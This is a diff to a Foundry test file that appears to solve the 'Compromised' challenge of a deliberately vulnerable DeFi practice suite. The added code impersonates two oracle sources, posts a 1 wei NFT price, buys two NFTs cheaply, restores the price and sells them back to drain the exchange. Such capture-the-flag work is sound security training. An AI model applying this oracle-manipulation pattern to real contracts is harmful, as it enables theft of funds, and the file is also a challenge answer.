@@ -76,7 +76,25 @@ contract Compromised is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.prank(0x81A5D6E50C214044bE44cA0CB057fe119097850c);
+        trustfulOracle.postPrice("DVNFT", 1 wei);
+        vm.prank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
+        trustfulOracle.postPrice("DVNFT", 1 wei);
+        console.log(trustfulOracle.getMedianPrice("DVNFT"));
+        vm.startPrank(attacker);
+        exchange.buyOne{value: 1 wei}();
+        exchange.buyOne{value: 1 wei}();
+        vm.stopPrank();
+        vm.prank(0x81A5D6E50C214044bE44cA0CB057fe119097850c);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), 1);
+        damnValuableNFT.approve(address(exchange), 2);
+        exchange.sellOne(1);
+        exchange.sellOne(2);
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
